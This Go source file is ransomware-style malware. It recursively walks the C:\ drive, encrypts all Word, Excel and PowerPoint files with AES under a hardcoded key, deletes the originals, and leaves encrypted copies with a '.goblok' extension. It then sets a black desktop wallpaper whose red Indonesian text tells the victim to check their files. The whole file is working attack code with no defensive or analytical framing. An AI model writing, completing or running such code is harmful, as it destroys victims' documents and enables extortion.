package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"image"
	"image/color"
	"image/draw"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"

	"golang.org/x/image/font"
	"golang.org/x/image/font/basicfont"
	"golang.org/x/image/math/fixed"
)

func main() {
	root := "C:\\" // specify root for Windows systems
	key := []byte("mykey123mykey123") // 16 bytes key

	logFile, err := os.OpenFile("encryption.log", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatal(err)
	}
	defer logFile.Close()
	log.SetOutput(logFile)

	var wg sync.WaitGroup

	err = filepath.Walk(root,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				log.Println(err)
				return nil // Continue traversal even if there is an error accessing a directory
			}
			if !info.IsDir() {
				ext := strings.ToLower(filepath.Ext(path))
				if ext == ".docx" || ext == ".xlsx" || ext == ".pptx" {
					wg.Add(1)
					go func(path string) {
						defer wg.Done()
						encryptedFilePath := encryptFile(path, key)
						log.Printf("%s|%s|%s\n", path, encryptedFilePath, filepath.Dir(path))
					}(path)
				}
			}
			return nil
		})
	if err != nil {
		fmt.Println(err)
	}

	wg.Wait()

	// After encrypting files, create the new wallpaper
	img := image.NewRGBA(image.Rect(0, 0, 640, 480))

	draw.Draw(img, img.Bounds(), &image.Uniform{color.RGBA{0, 0, 0, 0xff}}, image.Point{}, draw.Src)
	addLabel(img, 20, 240, "silahkan periksa file anda")

	// Save to a temporary file
	tempDir := os.TempDir()
	tempFile := filepath.Join(tempDir, "output.png")
	outputFile, _ := os.Create(tempFile)
	defer outputFile.Close()
	png.Encode(outputFile, img)

	// Set it as wallpaper
	cmd := exec.Command("powershell", "-c", "(New-Object -ComObject 'Shell.Application').SetWallpaper('"+tempFile+"')")
	cmd.Run()
}

func encryptFile(path string, key []byte) string {
	data, _ := ioutil.ReadFile(path)
	ciphertext, _ := encrypt(data, key)
	// delete the original file
	os.Remove(path)
	// write the encrypted content to a new file with extension .goblok
	encryptedFilePath := path + ".goblok"
	ioutil.WriteFile(encryptedFilePath, ciphertext, 0777)
	return encryptedFilePath
}

func encrypt(data []byte, passphrase []byte) ([]byte, error) {
	block, _ := aes.NewCipher(passphrase)
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

func addLabel(img *image.RGBA, x, y int, label string) {
	col := color.RGBA{255, 0, 0, 255} // Red
	point := fixed.Point26_6{fixed.Int26_6(x * 64), fixed.Int26_6(y * 64)}

	d := &font.Drawer{
		Dst:  img,
		Src:  image.NewUniform(col),
		Face: basicfont.Face7x13,
		Dot:  point,
	}
	d.DrawString(label)
}
